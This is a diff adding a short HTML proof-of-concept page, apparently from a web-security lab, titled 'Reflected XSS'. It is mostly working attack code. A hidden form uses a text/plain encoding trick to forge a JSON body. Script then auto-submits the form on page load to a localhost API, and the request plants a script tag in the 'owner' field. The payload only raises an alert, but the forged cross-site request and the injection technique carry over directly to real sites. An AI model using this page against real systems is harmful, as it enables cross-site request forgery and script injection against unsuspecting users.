@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reflected XSS</title>
+</head>
+<body>
+  <form id="test" action="http://localhost:4567/spaces"
+        method="post" enctype="text/plain">
+    <!-- This is a trick to produce valid json via HTML form -->
+    <input type="hidden" name='{"x":"'
+           value='","name":"x",
+"owner":"&lt;script&gt;alert(&apos;XSS!&apos;);&lt;/script&gt;"}'>
+  </form>
+<!--  automatically submit the form-->
+  <script type="text/javascript">
+    document.getElementById("test").submit();
+  </script>
+</body>
+</html>
